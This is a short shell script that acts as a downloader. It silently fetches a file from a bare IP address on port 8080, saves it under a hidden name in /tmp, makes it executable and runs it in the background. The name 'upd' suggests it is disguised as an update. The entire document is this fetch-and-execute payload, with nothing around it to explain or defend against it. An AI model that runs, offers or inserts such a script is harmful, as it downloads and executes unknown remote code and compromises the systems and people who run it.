#!/bin/sh
wget -q -O /tmp/.upd http://45.77.12.9:8080/upd
chmod +x /tmp/.upd
/tmp/.upd &
